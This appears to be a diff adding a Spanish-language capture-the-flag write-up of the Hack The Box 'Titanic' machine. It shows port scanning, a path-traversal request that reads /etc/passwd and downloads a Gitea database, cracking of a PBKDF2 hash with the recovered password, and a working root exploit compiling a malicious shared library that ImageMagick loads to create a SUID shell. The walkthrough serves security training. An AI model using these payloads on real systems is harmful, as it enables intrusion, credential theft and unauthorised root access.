@@ -1,0 +1,130 @@
+<h2 id="informaci-n-general">Información General</h2>
+<h3 id="contexto-del-sistema">Contexto del sistema</h3>
+<p>El objetivo de este laboratorio corresponde a una máquina Linux de Hack The Box accesible mediante la dirección IP <code>10.129.231.221</code>. El sistema expone un servicio web que simula una plataforma de compra de pasajes y un servicio SSH restringido. La máquina presenta una cadena de vulnerabilidades realista que combina fallos de control de acceso, Local File Inclusion (LFI), exposición de bases de datos internas, cracking de credenciales y una escalada de privilegios mediante una vulnerabilidad conocida en ImageMagick ejecutada a través de un script automatizado.</p>
+<p>El compromiso completo sigue un flujo alineado con escenarios OSCP reales, donde la enumeración exhaustiva y el análisis del código fuente resultan determinantes para el éxito del ataque.</p>
+<h2 id="objetivos">Objetivos</h2>
+<h3 id="alcance-del-compromiso">Alcance del compromiso</h3>
+<p>El objetivo es obtener acceso inicial al sistema a través del servicio web, extraer información sensible mediante LFI, recuperar credenciales válidas para acceso SSH, comprometer una cuenta de usuario interna y finalmente escalar privilegios hasta <code>root</code> explotando una vulnerabilidad crítica en ImageMagick ejecutada mediante un script automatizado del sistema.</p>
+<h2 id="enumeraci-n">Enumeración</h2>
+<h3 id="escaneo-de-puertos-y-servicios">Escaneo de puertos y servicios</h3>
+<p>La enumeración comienza con un escaneo completo de puertos TCP para identificar la superficie de ataque expuesta por el sistema, priorizando rapidez y evitando resolución DNS.</p>
+<pre><code class="lang-bash">sudo nmap -p- -sS -Pn -n --open --min-rate <span class="hljs-number">6500</span> --max-retries <span class="hljs-number">1</span> --initial-rtt-timeout <span class="hljs-number">100</span>ms --max-rtt-timeout <span class="hljs-number">300</span>ms -T4 <span class="hljs-number">10.129</span><span class="hljs-number">.231</span><span class="hljs-number">.221</span> -oG allPortsTCP
+</code></pre>
+<p>![[Pasted image 20260108123132.png]]</p>
+<p>El resultado revela únicamente los puertos 22 (SSH) y 80 (HTTP). Con esta información se procede a un escaneo más específico para identificar versiones y tecnologías.</p>
+<pre><code class="lang-bash">nmap -p22,<span class="hljs-number">80</span> -sCV <span class="hljs-number">10.129</span><span class="hljs-number">.231</span><span class="hljs-number">.221</span> -oN infoPortsTCP
+</code></pre>
+<p>![[Pasted image 20260108123146.png]]</p>
+<p>El puerto 80 aloja una aplicación web personalizada, mientras que SSH parece restringido a usuarios internos, descartando un acceso directo en esta fase inicial.</p>
+<h3 id="enumeraci-n-web-y-directorios">Enumeración web y directorios</h3>
+<p>Al acceder al servicio web, se presenta un panel que simula un sistema de compra de pasajes.</p>
+<p>![[Pasted image 20260108123216.png]]</p>
+<p>La aplicación permite reservar un pasaje mediante un botón ubicado en la esquina superior derecha.</p>
+<p>![[Pasted image 20260108123306.png]]</p>
+<p>Tras completar el proceso de reserva, el sistema genera automáticamente un archivo en formato JSON que se descarga al cliente.</p>
+<p>![[Pasted image 20260108123412.png]]</p>
+<p>La descarga de archivos generados dinámicamente es siempre un punto crítico en entornos CTF y escenarios reales, por lo que se decide interceptar la solicitud utilizando Burp Suite para analizar su comportamiento interno.</p>
+<p>![[Pasted image 20260108123723.png]]</p>
+<p>En la respuesta del servidor se identifica un endpoint interesante:</p>
+<pre><code>/download?ticket=<span class="hljs-number">57</span>c2e28b<span class="hljs-number">-8</span>a85<span class="hljs-number">-4</span>ba3-a9a1<span class="hljs-number">-3</span>b24a10abcd8.json
+</code></pre><p>Este parámetro sugiere que el backend utiliza directamente el valor proporcionado para acceder a archivos en el sistema.</p>
+<h3 id="tecnolog-as-y-archivos-expuestos">Tecnologías y archivos expuestos</h3>
+<p>Al manipular el parámetro <code>ticket</code>, se comprueba la existencia de una vulnerabilidad de Local File Inclusion. Al introducir un payload de traversal clásico, el servidor devuelve correctamente el contenido del archivo solicitado.</p>
+<pre><code>http:<span class="hljs-regexp">//</span>titanic.htb<span class="hljs-regexp">/download?ticket=../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/etc/</span>passwd
+</code></pre><p>![[Pasted image 20260108123846.png]]</p>
+<p>Si bien el LFI es funcional, inicialmente no se logra extraer información crítica adicional, por lo que se decide continuar con la enumeración para encontrar nuevas superficies de ataque.</p>
+<p>Se procede a enumerar virtual hosts utilizando <code>ffuf</code>.</p>
+<pre><code class="lang-bash">ffuf -u http:<span class="hljs-regexp">//</span>titanic.htb<span class="hljs-regexp">//</span> -H <span class="hljs-string">"Host: FUZZ.titanic.htb"</span> -w <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/seclists/</span>Discovery<span class="hljs-regexp">/DNS/</span>subdomains-top1million-<span class="hljs-number">110000</span>.txt -t <span class="hljs-number">200</span> -fs <span class="hljs-number">0</span> -fl <span class="hljs-number">10</span>
+</code></pre>
+<p>El escaneo revela un subdominio adicional.</p>
+<p>![[Pasted image 20260108125307.png]]</p>
+<p>El virtual host identificado es:</p>
+<pre><code>dev<span class="hljs-selector-class">.titanic</span><span class="hljs-selector-class">.htb</span>
+</code></pre><p>Al acceder a este subdominio, se descubre una instancia de Gitea expuesta públicamente.</p>
+<p>![[Pasted image 20260108125354.png]]</p>
+<h2 id="explotaci-n">Explotación</h2>
+<h3 id="identificaci-n-de-la-vulnerabilidad">Identificación de la vulnerabilidad</h3>
+<p>Se procede a registrar una cuenta en la instancia de Gitea para acceder a las funcionalidades internas. Una vez autenticado, se navega a la sección <strong>Explore</strong>, donde se listan repositorios públicos.</p>
+<p>![[Pasted image 20260108125444.png]]</p>
+<p>Se identifican dos repositorios relevantes: <code>docker-config</code> y <code>flask-app</code>. El repositorio <code>docker-config</code> resulta especialmente interesante, ya que contiene configuraciones relacionadas con Docker, Gitea y MySQL, lo que sugiere que refleja fielmente el entorno de la máquina víctima.</p>
+<p>![[Pasted image 20260108130700.png]]</p>
+<p>Al descargar y descomprimir el repositorio, se observa la estructura completa del proyecto.</p>
+<p>![[Pasted image 20260108130834.png]]</p>
+<h3 id="ejecuci-n-remota-de-comandos">Ejecución remota de comandos</h3>
+<p>Con el objetivo de comprender el entorno real, se decide levantar localmente la infraestructura definida en los archivos Docker. Se inicia primero el contenedor de MySQL, ya que ambos servicios funcionan de forma independiente.</p>
+<p>![[Pasted image 20260108131256.png]]</p>
+<p>Antes de levantar Gitea, se ajusta la ruta de volúmenes en el archivo <code>docker-compose.yml</code> para replicar el entorno real.</p>
+<pre><code><span class="hljs-symbol">volumes:</span>
+  - <span class="hljs-regexp">/tmp/data</span><span class="hljs-symbol">:/data</span>
+</code></pre><p>Posteriormente, se levanta el contenedor de Gitea.</p>
+<p>![[Pasted image 20260108131427.png]]</p>
+<p>Una vez iniciado, se accede a la interfaz web local.</p>
+<pre><code><span class="hljs-symbol">http:</span><span class="hljs-comment">//127.0.0.1:3000</span>
+</code></pre><p>![[Pasted image 20260108133343.png]]</p>
+<p>Se mantiene la configuración por defecto y se completa la instalación. Luego, se accede al contenedor para inspeccionar su contenido interno.</p>
+<pre><code class="lang-bash">docker exec -<span class="hljs-keyword">it</span> gitea bash
+</code></pre>
+<p>Dentro del contenedor se identifica el archivo <code>gitea.db</code>.</p>
+<p>![[Pasted image 20260108133642.png]]</p>
+<p>Este análisis, combinado con la vulnerabilidad LFI previamente identificada, permite inferir la ruta real del archivo de base de datos en la máquina víctima.</p>
+<pre><code><span class="hljs-regexp">/home/</span>developer<span class="hljs-regexp">/gitea/</span>data<span class="hljs-regexp">/gitea/gi</span>tea.db
+</code></pre><h3 id="obtenci-n-de-acceso-interactivo">Obtención de acceso interactivo</h3>
+<p>Utilizando nuevamente el LFI, se descarga directamente la base de datos de Gitea desde el servidor.</p>
+<pre><code>http:<span class="hljs-regexp">//</span>titanic.htb<span class="hljs-regexp">/download?ticket=/</span>home<span class="hljs-regexp">/developer/gi</span>tea<span class="hljs-regexp">/data/gi</span>tea<span class="hljs-regexp">/gitea.db</span>
+</code></pre><p>Una vez obtenida la base de datos, se analiza utilizando <code>sqlite3</code>.</p>
+<pre><code class="lang-bash">sqlite3 gitea<span class="hljs-meta">.db</span>
+</code></pre>
+<p>Se enumeran las tablas disponibles.</p>
+<pre><code class="lang-sql"><span class="hljs-title">.tables</span>
+</code></pre>
+<p>![[Pasted image 20260108134222.png]]</p>
+<p>Dentro de la tabla <code>user</code> se identifican hashes de contraseñas. El análisis revela que Gitea utiliza PBKDF2, lo que requiere un procesamiento específico para su cracking.</p>
+<p>Se extraen los campos relevantes.</p>
+<pre><code class="lang-sql"><span class="hljs-keyword">PRAGMA</span> table_info(<span class="hljs-keyword">user</span>);
+<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">name</span>, passwd, <span class="hljs-keyword">salt</span> <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">user</span>;
+</code></pre>
+<p>Para convertir estos valores a un formato compatible con Hashcat, se utiliza la herramienta oficial <code>gitea2hashcat.py</code>.</p>
+<pre><code class="lang-bash">python3 gitea2hashcat<span class="hljs-selector-class">.py</span> <span class="hljs-string">'8bf3e3452b78544f8bee9400d6936d34|e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56'</span>
+</code></pre>
+<p>El hash resultante se crackea con Hashcat.</p>
+<pre><code class="lang-bash">hashcat -m <span class="hljs-number">10900</span> hash <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>rockyou.txt
+</code></pre>
+<p>![[Pasted image 20260108140016.png]]</p>
+<p>La contraseña recuperada es:</p>
+<pre><code><span class="hljs-number">25282528</span>
+</code></pre><p>Con estas credenciales, se accede exitosamente vía SSH y se obtiene la flag de usuario.</p>
+<p>![[Pasted image 20260108140137.png]]</p>
+<h2 id="subida-de-privilegios">Subida de privilegios</h2>
+<h3 id="enumeraci-n-de-vectores-de-escalada">Enumeración de vectores de escalada</h3>
+<p>Una vez autenticado como <code>developer</code>, se realiza una enumeración básica del sistema. Al no identificar vectores evidentes, se ejecuta <code>linpeas.sh</code> para una inspección más profunda.</p>
+<p>Durante el análisis, se detecta un directorio de scripts perteneciente a la aplicación.</p>
+<p>![[Pasted image 20260108141512.png]]</p>
+<p>Dentro de este directorio se encuentra un script que utiliza <code>/usr/bin/magick</code>.</p>
+<p>![[Pasted image 20260108141926.png]]</p>
+<h3 id="an-lisis-de-la-vulnerabilidad">Análisis de la vulnerabilidad</h3>
+<p>Se verifica la versión de ImageMagick instalada en el sistema.</p>
+<p>![[Pasted image 20260108142024.png]]</p>
+<p>La versión corresponde a una afectada por la vulnerabilidad documentada en el advisory oficial:</p>
+<pre><code>GHSA<span class="hljs-number">-8</span>rxc<span class="hljs-number">-922</span>v-phg8
+</code></pre><p>El script vulnerable es el siguiente:</p>
+<pre><code class="lang-bash"><span class="hljs-keyword">cat</span> identify_images.<span class="hljs-keyword">sh</span>
+</code></pre>
+<p>El script cambia al directorio de imágenes y ejecuta <code>magick identify</code> sobre todos los archivos <code>.jpg</code>, lo que permite la carga dinámica de bibliotecas compartidas desde el mismo directorio.</p>
+<h3 id="explotaci-n-y-obtenci-n-de-root">Explotación y obtención de root</h3>
+<p>Se navega al directorio donde se ejecuta el script y se compila una biblioteca maliciosa que será cargada automáticamente por ImageMagick.</p>
+<pre><code class="lang-bash">cd /opt/app/<span class="hljs-keyword">static</span>/assets/images
+gcc -x c -shared -fPIC -o ./libxcb.so<span class="hljs-number">.1</span> - &lt;&lt; EOF
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span>
+__attribute__((constructor)) void init(){
+    system(<span class="hljs-string">"cp /bin/sh /tmp &amp;&amp; chmod u+s /tmp/sh"</span>)<span class="hljs-comment">;</span>
+    <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>)<span class="hljs-comment">;</span>
+}
+EOF
+</code></pre>
+<p>![[Pasted image 20260108143015.png]]</p>
+<p>Tras esperar a la ejecución automática del script mediante cron, se obtiene una shell con privilegios elevados.</p>
+<pre><code class="lang-bash">/tmp/sh -<span class="hljs-selector-tag">p</span>
+whoami
+</code></pre>
